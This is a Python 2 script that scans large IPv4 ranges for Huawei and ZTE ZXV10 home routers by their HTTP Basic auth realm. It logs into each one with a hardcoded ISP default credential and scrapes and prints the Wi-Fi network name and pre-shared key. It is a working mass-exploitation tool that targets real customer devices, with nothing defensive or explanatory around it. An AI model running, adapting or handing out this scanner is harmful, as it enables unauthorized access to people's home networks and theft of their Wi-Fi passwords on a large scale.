# -*- coding: utf-8 -*-
import requests 
from requests.auth import HTTPBasicAuth 
from bs4 import BeautifulSoup 

w3 = 0
wei = 0
w3e = 0
#65.167.56.217
#pendiente http://190.24.235.8/
etb=open('routers.csv', 'a+')

for e in range(190,255):
    
    for l in range(24,255):
        
        for i in range(3,255):
            
            for s in range(1,255):##236.100   190.25.216.67 190.24.3.17
                
                ip = str(e)+'.'+str(l)+'.'+str(i)+'.'+str(s)
                try:
                    print 'probando '+ip
                    r = requests.get("http://"+ip+":80", timeout=2)
                    head = r.headers
                    b= 'WWW-Authenticate' in head
                    print r.header
                    if b == True:
                        
                        huawei = 'Basic realm="Home Gateway"'
                        huawei1 = 'Basic realm="EchoLife Home Gateway"'
                        w300 = 'Basic realm="ZXV10 W300"'
                        w300e = 'Basic realm="ZXV10 W300E"'
                        r1 = requests.get('http://'+ip+':80/', timeout=3)
                        n = r1.headers['WWW-Authenticate']
                        if n==huawei :#or n==huawei1:
                            
                            r2 = requests.get('http://'+ip+':80/home_wlan.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                            r2 = requests.get('http://'+ip+':80/home_wlan.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                            parser1 = r2.content
                            bs1=BeautifulSoup(parser1, "html.parser")
                            for ssid in bs1.find_all("input", {"name":"ESSID"}):
                                for pss in bs1.find_all("input", {"name":"PreSharedKey"}):
                                    
                                    
                                    print str(ip)+".....Huawei......."+str(ssid["value"])+"....."+str(pss["value"])
                        
                        elif n==w300:
                            while r.status_code=='401':
                                print str(head['WWW-Authenticate'])+'               '+ip
                                r3 = requests.get('http://'+ip+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                r3 = requests.get('http://'+ip+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                
                                
                                parser2 = r3.content
                                bs2=BeautifulSoup(parser2, "html.parser")
                                for name in bs2.find_all("input", {"name":"ESSID"}):
                                   #print str(name["value"])
                                    for key in bs2.find_all("input", {"name":"PreSharedKey"}): 
                                        w3 = w3 + 1
                                        print str(ip)+".....w300......."+str(name["value"])+"....."+str(key["value"])
                                        
                                for name in bs2.find_all("input", {"name":"BeetelESSID"}):
                                    for key in bs2.find_all("input", {"name":"BeetelPreSharedKey"}):
                                        w3 = w3 + 1                                    
                                        print str(ip)+".....w300......."+str(name["value"])+"....."+str(key["value"])
                            
                            
                        
                        elif n==w300e:
                            inte =0
                            while r.status_code!='200':
                                inte = inte + 1
                                
                                print str(head['WWW-Authenticate'])+'               '+ip
                                r4 = requests.get('http://'+ip+':80/basic/wlan_simple.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                rx = requests.get('http://'+ip+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                r4 = requests.get('http://'+ip+':80/basic/wlan_simple.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                rx = requests.get('http://'+ip+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                print 'rx '+str(rx.status_code)
                                parser3 = r4.content
                                parserx = rx.content
                            
                                """print parserx
                                print r4.headers
                                """
                                bsx = BeautifulSoup(parserx, "html.parser")
                            

                                parser4 = rx.content
                                bsx = BeautifulSoup(parser4, "html.parser")
                            
                                bs3=BeautifulSoup(parser3, "html.parser")
                            
                                for name in bsx.find_all("input", {"name":"ESSID"}):
                                    for key in bsx.find_all("input", {"name":"PreSharedKey"}):
                                        print str(ip)+".....w300ex......."+str(name["value"])+"....."+str(key["value"])
                                
                            
                                for name in bs3.find_all("input", {"name":"BeetelESSID"}):
                                    for key in bs3.find_all("input", {"name":"BeetelPreSharedKey"}):
                                        w3e = w3e + 1                                    
                                        print str(ip)+".....w300e......."+str(name["value"])+"....."+str(key["value"])
                                if inte==5:
                                    break
                            
                        
                        elif n==huawei1:
                            print 
                            while r.status_code!='200':
                                r2 = requests.get('http://'+ip+':80/home_wlan.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                mac = requests.get('http://'+ip+':80/rpSysStatus.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=None)
                                
                                parser1 = r2.content
                                parser2 = mac.content
                                bs1=BeautifulSoup(parser1, "html.parser")
                                bs = BeautifulSoup(parser2, "html.parser")
                            #"""
                                for ssid in bs1.find_all("input", {"name":"ESSID"}):
                                    for pss in bs1.find_all("input", {"name":"PreSharedKey"}):
                                    #v = str(pss["value"])
                                        print str(ip)+'....'+".....Huawei......."+str(ssid["value"])+"....."+str(pss["value"])
                                    #for mac in bs.find_all("td", {"class":"tablerowvalue"}):

                            
                        
                        
                        
                  
                except:
                    pass
                                
                            
                           
                                            
               
                                
                            
                           
                                